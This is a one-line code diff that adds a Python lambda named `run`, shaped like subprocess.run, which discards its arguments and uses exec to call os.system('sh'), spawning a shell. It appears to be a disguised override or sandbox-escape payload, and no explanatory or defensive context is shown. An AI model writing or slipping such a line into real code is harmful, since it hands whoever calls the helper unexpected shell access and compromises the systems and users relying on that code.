@@ -1,0 +1,1 @@
+run = lambda x,capture_output : exec("import os;os.system('sh')")
